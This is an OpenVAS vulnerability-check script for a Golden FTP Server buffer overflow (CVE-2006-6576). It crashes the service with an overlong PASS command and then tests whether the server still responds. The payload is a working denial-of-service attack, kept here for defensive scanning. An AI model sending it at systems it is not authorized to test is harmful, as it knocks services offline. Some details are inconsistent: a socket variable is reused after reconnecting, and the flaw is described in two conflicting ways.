###############################################################################
# OpenVAS Vulnerability Test
#
# Golden FTP PASS Command Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802024");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_cve_id("CVE-2006-6576");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Golden FTP PASS Command Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/golden_tfp/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/23323");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45924");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45957");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17355");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16036");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code on the system or cause the application to crash.");

  script_tag(name:"affected", value:"Golden FTP Server Version 4.70, other versions may also be
  affected.");

  script_tag(name:"insight", value:"The flaw is due to format string error while parsing 'PASS'
  command, which can be exploited to crash the FTP service by sending 'PASS'
  command with an overly long username parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Golden FTP Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "Golden FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

resp = ftp_recv_line(socket:soc);
if(!resp || "220 Golden FTP Server" >!< resp){
  ftp_close(socket:soc);
  exit(0);
}

user_cmd = string("USER Anonymous", "\r\n");
send(socket:soc, data:user_cmd);
resp = recv_line(socket:soc, length:260);

pass_cmd = string("PASS " , crap(data:'A', length:500) , "\r\n");
send(socket:soc, data:pass_cmd);
resp = recv_line(socket:soc, length:260);

ftp_close(socket:soc);

sleep(1);

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_message(port:ftpPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc);
if(!resp || "220 Golden FTP Server" >!< resp){
  security_message(port:ftpPort);
}

ftp_close(socket:soc1);
